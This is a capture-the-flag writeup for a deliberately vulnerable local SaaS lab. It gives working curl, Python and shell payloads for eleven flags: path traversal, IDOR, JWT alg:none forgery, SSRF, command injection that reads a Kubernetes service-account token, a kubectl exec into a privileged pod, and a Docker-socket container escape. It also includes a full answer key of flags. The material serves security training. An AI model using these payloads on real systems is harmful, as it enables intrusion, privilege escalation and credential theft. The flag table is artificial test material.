# Break the SaaS — Writeup

Intended solve paths for every flag, with requests (curl). Flags are `FLAG{...}`.

Base URL: `http://localhost:8123` (docker compose) or `http://ctf.localhost/` (deployed).

---

## F1 — Docker layer leak
`.env.leaked` is `COPY`'d to `/app/.env`, then deleted (`RUN rm`). The file is gone from the final image filesystem, but survives inside the intermediate layer's tarball. `docker history` only shows the `COPY` command — it does **not** reveal the contents. To recover the deleted file you must extract the layer.

```bash
# 1. confirm the file is gone from the final image (it is — that's the point)
docker run --rm --entrypoint sh ctf/backend:latest -c "ls /app/.env* 2>/dev/null || echo 'gone'"

# 2. export the image and unpack its layers
docker save ctf/backend:latest -o backend.tar && tar xf backend.tar

# 3. scan each layer blob for the deleted /app/.env and print it
for blob in blobs/sha256/*; do
  tar tzf "$blob" 2>/dev/null | grep -qx "app/.env" && tar xzf "$blob" -O app/.env && break
done
```
```
FLAG=FLAG{d0ck3r_l4y3rs_n3v3r_f0rg3t}
```
flag: `FLAG{d0ck3r_l4y3rs_n3v3r_f0rg3t}`

> Lesson: `RUN rm` only adds a *whiteout* layer; the file content persists in earlier layers. Never put secrets in a layer — use multi-stage builds or build-time secrets (`--secret`).

---

## F2 — Exposed Swagger/OpenAPI schema
`/api/schema/` and `/swagger.json` are not linked in the UI (hinted via `robots.txt`) and leak the flag in `info.description`, plus reveal the hidden `/api/internal/flag` route.

```bash
curl http://localhost:8123/api/schema/
curl http://localhost:8123/swagger.json
```
```
flag: FLAG{sw4gg3r_wh0_g03s_th3r3}
```

---

## F3 — Unauthorized debug endpoint
Hidden route (leaked in a JS comment on the dashboard) gated only by a debug header.

```bash
curl -H "X-Debug-Mode: true" http://localhost:8123/api/internal/flag
```
```
{"flag": "FLAG{fl4g_3ndp01nt_f0und_1t}"}
```

---

## F4 — Path traversal
`file` is joined to `/app/reports/` with no sanitization (`os.path.join`). The endpoint also lists directories: hit it with no `file` to enumerate `/app/reports/`, then `?file=../` to list `/app/` and spot `flag.txt`.

```bash
curl "http://localhost:8123/api/reports/download"              # lists /app/reports/
curl "http://localhost:8123/api/reports/download?file=../"      # lists /app/ -> reveals flag.txt
curl "http://localhost:8123/api/reports/download?file=../flag.txt"
```
```
flag: FLAG{p4th_tr4v3rs4l_1s_cl4ss1c}
```

---

## F5 — IDOR (cross-tenant read)
`/api/orgs/<org_id>/reports/<report_id>` returns `secret_note` with no ownership check. Any logged-in user can read another org's report.

```bash
curl http://localhost:8123/api/orgs/2/reports/2
```
```
{"title": "Globex Internal Audit", "secret_note": "FLAG{1d0r_t3n4nt_l34k}"}
```

---

## F6 — JWT algorithm confusion / weak secret
JWT verification accepts `alg: none` (unverified decode) and the HS256 secret `changeme123` is weak. `/admin/dashboard` requires a `role: admin` claim.

### Route A: `alg: none`
```python
import base64, json

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()

h = b64({"alg": "none", "typ": "JWT"})
p = b64({"sub": "1", "username": "acmeuser", "role": "admin"})
token = h + "." + p + "."
```
```bash
curl -H "Authorization: Bearer <token>" http://localhost:8123/admin/dashboard
```

### Route B: forge HS256 with the weak secret
```python
import jwt
token = jwt.encode({"sub": "1", "username": "acmeuser", "role": "admin"}, "changeme123", algorithm="HS256")
```
```bash
curl -H "Authorization: Bearer <token>" http://localhost:8123/admin/dashboard
```
```
flag: FLAG{jwt_4lg_n0n3_0r_w34k_s3cr3t}
```

---

## F7 — SSRF into the internal network
The webhook tester fetches a URL server-side with TLS verification disabled and no target allowlist.

```bash
curl -X POST http://localhost:8123/api/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel:5000/","method":"GET"}'
```
(In-cluster: `http://admin-panel.internal-tools.svc.cluster.local/`)
```
flag: FLAG{ssrf_1nt0_th3_1nt3rn4l_n3t}
```

---

## F8 — SSRF → k8s API with the pod's own (cluster-reader) token
The `backend-sa` token is bound to the cluster-wide `cluster-reader` role (`get/list/watch` on `*.*`), so it can read **any** secret. Get the token, then use it against the k8s API.

```bash
# 1. steal the SA token via F9's RCE:
#      ; cat /var/run/secrets/kubernetes.io/serviceaccount/token
#    -> returns a Bearer JWT (backend-sa)

# 2. use it against the k8s API for the secret (any namespace works — it's cluster-wide)
curl -s -X POST http://localhost:8123/api/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets/flag-secret","method":"GET","headers":{"Authorization":"Bearer <token>"}}'
# base64-decode the `flag` value
```
```
flag: FLAG{m3t4d4t4_svc_l34k3d_my_t0k3n}
```

---

## F9 — Command injection
`host` is interpolated into `subprocess.run(f"ping -c 2 {host}", shell=True)` unescaped. The flag lives at an unguessable directory, so `find` reveals it first.

```bash
curl -X POST http://localhost:8123/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; find / -iname flag.txt 2>/dev/null"}'

curl -X POST http://localhost:8123/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```
```
flag: FLAG{c0mm4nd_1nj3ct10n_1s_st1ll_4l1v3}
```

---

## F10 — Privileged pod escape (in-cluster)
`legacy-worker` in `escape-zone` is privileged, has the host root mounted at `/host`, and the flag is at `/var/lib/node-data/flag.txt` on the node (written by its initContainer). From inside the pod the path is the **hostPath mount**: `/host/var/lib/node-data/flag.txt`.

The webhook SSRF returns plain HTTP bodies and **cannot** drive the SPDY/WebSocket exec API. From F9's RCE, use the **bundled** `kubectl` (baked into the backend image), pointing it straight at the k8s API with the mounted `backend-sa` token — one injection, no kubeconfig needed:

```bash
curl -X POST http://ctf.localhost/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl --server=https://kubernetes.default.svc --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"}'
```
Gotchas: the exec path must use the `/host` prefix (bare `/var/lib/...` inside the pod does not exist); kubectl prints SPDY chatter to log.go — use `2>/dev/null` if the noise bothers you (the flag still lands in the response).
```
flag: FLAG{pr1v1l3g3d_p0d_h0stp4th_3sc4p3}
```

---

## F11 — Docker socket escape (bonus, unadvertised)
`ctf-worker2` mounts host `/var/run/docker.sock` at the node; `legacy-worker`'s hostPath `/` exposes it at `/host/run/docker.sock` (the node's `/var/run` symlink doesn't survive the hostPath mount). From F10's exec, run `curl` (bundled in the escape-zone image) straight through `kubectl exec` — one injection. To avoid shell-quoting pain, base64 a small script and decode+run it inside the pod:

```bash
# 1. the script to run in legacy-worker (curl is baked into the image):
#    curl -s --unix-socket /host/run/docker.sock -X POST -H "Content-Type: application/json" \
#      -d '{"Image":"ctf/backend:latest","User":"0","HostConfig":{"Binds":["/:/mnt"],"Privileged":true},"Cmd":["/bin/cat","/mnt/home/ubuntu/flag.txt"]}' \
#      "http://localhost/v1.41/containers/create?name=esc"
#    curl -s --unix-socket /host/run/docker.sock -X POST "http://localhost/v1.41/containers/esc/start"
#    sleep 1; curl -s --unix-socket /host/run/docker.sock "http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1"
#
#    base64 -w0 <<< "above script"
# 2) one injection: decode the b64 and exec it
curl -X POST http://ctf.localhost/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl --server=https://kubernetes.default.svc --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt exec -n escape-zone legacy-worker -- sh -c \"$(echo <B64> | base64 -d)\""}'
```
```
flag: FLAG{d0ck3r_s0ck3t_1s_th3_r34l_r00t}
```
Notes: the VM host docker has no `alpine/busybox` image — reuse `ctf/backend:latest`; `"User":"0"` is required (the image's `app` uid would otherwise apply). `logs` output has a 1-byte channel-header prefix before the flag; the container is named `esc` (delete with `docker rm -f esc` before re-running).

---

## Flag reference

| # | Flag |
|---|---|
| F1 | `FLAG{d0ck3r_l4y3rs_n3v3r_f0rg3t}` |
| F2 | `FLAG{sw4gg3r_wh0_g03s_th3r3}` |
| F3 | `FLAG{fl4g_3ndp01nt_f0und_1t}` |
| F4 | `FLAG{p4th_tr4v3rs4l_1s_cl4ss1c}` |
| F5 | `FLAG{1d0r_t3n4nt_l34k}` |
| F6 | `FLAG{jwt_4lg_n0n3_0r_w34k_s3cr3t}` |
| F7 | `FLAG{ssrf_1nt0_th3_1nt3rn4l_n3t}` |
| F8 | `FLAG{m3t4d4t4_svc_l34k3d_my_t0k3n}` |
| F9 | `FLAG{c0mm4nd_1nj3ct10n_1s_st1ll_4l1v3}` |
| F10 | `FLAG{pr1v1l3g3d_p0d_h0stp4th_3sc4p3}` |
| F11 | `FLAG{d0ck3r_s0ck3t_1s_th3_r34l_r00t}` |

---

## Local testing (docker compose)
```bash
cd CTF
docker compose up -d --build
# backend: http://localhost:8123 | admin-panel: http://localhost:5080
```
In compose, SSRF targets are reached by service name (`http://admin-panel:5000/`); in-cluster they are ClusterIP FQDNs under `internal-tools.svc.cluster.local`.

---

## Platform notes (no flags)
- A **worker sidecar** runs in the backend pod (`python manage.py runworker`) and, every ~25s, exercises the backend's real access: it reads its mounted `backend-sa` token and calls the k8s API (`list pods in escape-zone`) and pings the internal `admin-panel`. Results surface in the dashboard **Activity** feed (`GET /api/events`). This visibly demonstrates the same reach that F7 (SSRF→admin-panel), F8 (token→k8s API→secret), and F10 (exec into escape-zone) abuse — the access is real and on display.
- SQLite is **ephemeral** — it lives on a shared `emptyDir` mounted at `/app/db` (`SQLITE_PATH=/app/db/db.sqlite3`) so web and worker share one DB; reset is `kubectl delete pod -n saas-app <backend-pod>` (the DB + feed rebuild on restart).
- Self-register is open into Org A (auto-assigned) with a 100-account cap; no invite codes.